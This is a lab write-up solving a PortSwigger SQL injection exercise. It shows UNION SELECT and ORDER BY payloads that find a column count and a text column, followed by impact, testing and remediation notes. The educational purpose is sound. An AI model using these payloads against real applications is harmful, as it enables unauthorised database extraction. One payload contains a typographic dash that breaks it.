# SQL injection UNION attack, finding a column containing text

- Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). Verify that the query is returning three columns, using the following payload in the `category` parameter: `'+UNION+SELECT+NULL,NULL,NULL--`
- Try replacing each null with the random value provided by the lab, for example: `'+UNION+SELECT+'abcdef',NULL,NULL--`
- If an error occurs, move on to the next null and try that instead.

Having identified the required number of columns . next task is to discover a column that has a string data type so that you can use this to extract arbitrary data from the database. You can do this by injecting a query containing NULLs, as you did previously and systematically replacing each NULL with **‘a’. **For example, if you know that the query must return three columns, you can inject the following.

```text
' UNION SELECT 'a', NULL, NULL--
' UNION SELECT NULL, 'a', NULL--
' UNION SELECT NULL, NULL, 'a'--
```

When the query is executed, you can see an additional row of data containing the value **‘a’. **You can then use that relevant column which has the data type string to extract data from the database.

If the data type of a column is not compatible with string data, the injected query will cause a database error. You can use that database errors to determine the columns which have the data type string.

Let’s solve the **Lab-4 **[**SQL injection UNION attack, finding a column containing text**](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

SQLi vulnerability: product category filter.

**STEP #1 Determine the number of columns returned by the original query.**

As we discussed in the previous post, we can do this using either Injecting a series of ORDER BY clauses or injecting a series of UNION SELECT payloads.

```sql
'+UNION+SELECT+NULL,NULL,NULL—
```

For the demonstration of this Lab exercise, I am using the ORDER BY clause.

```text
' ORDER BY 1 --
```

![](./images/e315e4067a24_001.png)

```text
' ORDER BY 2 --
```

```text
' ORDER BY 3 --
```

![](./images/e315e4067a24_002.png)

```text
' ORDER BY 4 --
```

![](./images/e315e4067a24_003.png)

```text
' ORDER BY 4 --                          Returns an error message.
```

**Therefore number of columns returned by the original query is 3**

**STEP #2 Discover the column that has a string data type.**

```text
' UNION SELECT 'a', NULL, NULL --
```

![](./images/e315e4067a24_004.png)

```text
' UNION SELECT NULL, 'a', NULL --
```

![](./images/e315e4067a24_005.png)

```text
' UNION SELECT NULL, NULL, 'a' --
```

```text
' UNION SELECT 'a', NULL, NULL--         Returns an error message.
' UNION SELECT NULL, 'a', NULL--         Returns 200 response code.
' UNION SELECT NULL, NULL, 'a'--         Returns an error message.
```

**Therefore column 2 has the string data type.**

**STEP #3 Return an additional row which contains the string value provided in the lab.**

Value provided by the Lab: ‘**NAv682’**

You can use the provided string value instead of ‘a’ to solve the Lab exercise as follows:

```text
' UNION SELECT NULL, 'NAv682', NULL --
```

### Why It Works

The vulnerability exists because the application processes user-controlled input without adequate security validation. In this specific lab, the attack succeeds because:

- The application trusts the user input without proper server-side validation
- The input reaches a sensitive operation (database query, HTML rendering, system command, etc.) without sanitization
- The security boundary that should protect the operation is missing or incorrectly implemented
- The specific payload used exploits the exact weakness in the application's input handling

The PortSwigger lab description confirms this: "This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data fro"

### Attack Flow

**Attack Flow:**

```
Attacker Input (payload in request)
        ↓
Application Functionality (processes user input)
        ↓
Server Processing (no validation/sanitization)
        ↓
Injection Point (input reaches sensitive operation)
        ↓
Exploitation (payload executes as intended)
        ↓
Lab Objective Achieved
```

### Real-World Impact

An attacker could extract all database contents (user credentials, personal data, payment cards), bypass authentication, modify database contents, execute OS commands, access other databases on the same server, or cause denial of service.

### Detection / Testing Methodology

1. Identify all input points that interact with the database (search, login, product filters, URL parameters)
2. Test with single quotes (') and SQL-specific characters to detect syntax errors
3. Test for boolean-based blind injection (AND 1=1 vs AND 1=2)
4. Test for time-based blind injection (SLEEP/WAITFOR DELAY)
5. Test for UNION injection by determining column count (ORDER BY)
6. Identify the database type via version-specific syntax
7. Use sqlmap for automated extraction

### Remediation

- Use parameterized queries (prepared statements) for ALL database access
- Use stored procedures with parameterized inputs
- Implement input validation (type, length, format) as defense-in-depth
- Apply least-privilege database accounts (no DROP, xp_cmdshell, or admin access)
- Disable database error messages in production
- Use a Web Application Firewall (WAF) as additional protection

### Key Takeaways

- This lab demonstrates a sql injection vulnerability in a real-world scenario.
- The vulnerability occurs because user input reaches a sensitive operation without proper validation.
- The PortSwigger lab confirms: "This lab contains a SQL injection vulnerability in the product category filter. The results from the"
- Burp Suite is essential for identifying and exploiting this vulnerability.
- The remediation for this specific vulnerability involves: - Use parameterized queries (prepared statements) for ALL database access
